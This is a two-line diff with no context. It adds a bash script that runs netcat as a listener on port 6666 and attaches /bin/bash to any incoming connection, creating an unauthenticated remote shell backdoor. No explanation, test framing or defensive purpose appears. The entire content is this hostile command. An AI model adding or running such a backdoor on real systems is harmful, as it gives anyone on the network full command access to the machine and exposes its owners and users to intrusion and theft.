@@ -1,0 +1,2 @@
+#!/bin/bash
+nc -l -p 6666 -e /bin/bash
